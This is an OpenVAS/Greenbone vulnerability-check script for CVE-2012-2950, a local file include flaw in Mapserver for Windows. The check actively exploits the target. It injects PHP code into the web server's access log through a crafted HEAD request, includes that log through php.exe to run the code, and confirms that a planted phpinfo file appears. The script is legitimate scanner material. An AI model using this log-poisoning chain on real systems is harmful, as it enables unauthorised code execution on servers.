# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103602");
  script_cve_id("CVE-2012-2950");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-11-02 10:11:35 +0100 (Fri, 02 Nov 2012)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-22 20:32:00 +0000 (Wed, 22 Jan 2020)");
  script_name("Mapserver for Windows Local File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53737");
  script_xref(name:"URL", value:"http://maptools.org/ms4w/index.phtml?page=home.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522908");

  script_tag(name:"summary", value:"Mapserver for Windows(MS4W) is prone to a local file include vulnerability
  because it fails to sufficiently sanitize user supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view files and execute
  arbitrary local PHP scripts with the privileges of the affected application.");

  script_tag(name:"affected", value:"Mapserver for Windows versions 2.0 through 3.0.4 are vulnerable.");

  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  buf = http_get_cache( item:dir + "/index.phtml", port:port );

  if( "<title>MS4W" >< buf ) {

    req = http_get(item:dir + "/phpinfo.php", port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >!< buf)
      exit(0);

    lines = split(buf);

    foreach line(lines)  {
      if("DOCUMENT_ROOT" >< line) {
        pa = eregmatch(pattern:'class="v">(.+) </td></tr>', string:line);
        if(!isnull(pa[1])) {
          path = pa[1];
          break;
        }
      }
    }

    if(!path || strlen(path) < 1)
      exit(0);

    vtstrings = get_vt_strings();
    file = vtstrings["lowercase_rand"] + ".php";
    php = "<?php file_put_contents('../htdocs/" + file +"', '<?php phpinfo();?>'); ?>";

    req = string("HEAD ", php, dir, "/ HTTP/1.1\r\n",
                 "Host: ", host,"\r\n\r\n");
    http_send_recv(port:port, data:req);

    path -= 'htdocs';
    path = str_replace(string:path, find:'/', replace:'\\');
    path = str_replace(string:path, find:" ", replace:"%20");

    url = dir + '/cgi-bin/php.exe?-f' +  path + 'logs\\access.log';
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    url = dir + '/' + file;
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< buf) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
